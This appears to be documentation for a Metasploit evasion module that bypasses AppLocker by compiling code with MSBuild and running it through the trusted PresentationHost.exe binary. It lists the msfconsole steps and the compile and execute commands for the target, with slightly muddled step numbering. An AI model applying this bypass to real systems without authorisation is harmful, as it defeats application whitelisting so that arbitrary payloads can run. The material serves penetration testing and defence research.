## Intro

This module is designed to evade solutions such as software restriction policies and Applocker.
Applocker in its default configuration will block code in the form of executables (.exe and .com, .msi), scripts (.ps1, .vbs, .js) and dll's from running in user controlled directories.
Applocker enforces this by employing whitelisting, in that code can only be run from the protected directories and sub directories of "Program Files" and "Windows"
The main vector for this bypass is to use the trusted binary PresentationHost.exe to execute user supplied code as this binary is located within the trusted Windows directory.

## Vulnerable Application

This evasion will work on all versions of Windows that include .NET versions 3.5 or greater that has solutions such as Applocker or Software Restriction Policies active, that do not explicitly block PresentationHost.exe.

## Options

- **FILE_ONE** - Filename for the evasive file (default: presentationhost.xaml.cs).
- **FILE_TWO** - Filename for the evasive file (default: presentationhost.manifest).
- **FILE_THREE** - Filename for the evasive file (default: presentationhost.csproj).

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use evasion/windows/applocker_evasion_presentationhost`
  3. Do: `set PAYLOAD <payload>` (note: only x86 payloads are supported by this module)
  4. Do: `run`
  5. The module will now display instructions of how to proceed
  6. `[+] presentationhost.xaml.cs stored at /root/.msf4/local/presentationhost.xaml.cs`
  7. `[+] presentationhost.manifest stored at /root/.msf4/local/presentationhost.manifest`
  8. `[+] presentationhost.csproj stored at /root/.msf4/local/presentationhost.csproj`
  9. `[*] Copy presentationhost.xaml.cs, presentationhost.manifest and presentationhost.csproj to the target`
  8. `[*] Compile using: C:\Windows\Microsoft.Net\Framework\[.NET Version]\MSBuild.exe presentationhost.csproj` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
  9. `[*] Execute using: C:\Windows\System32\PresentationHost.exe [Full Path To] presentationhost.xbap` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319") and replace [Full Path To] with the full path to the .xbap.

## References

https://medium.com/tsscyber/applocker-bypass-presentationhost-exe-8c87b2354cd4
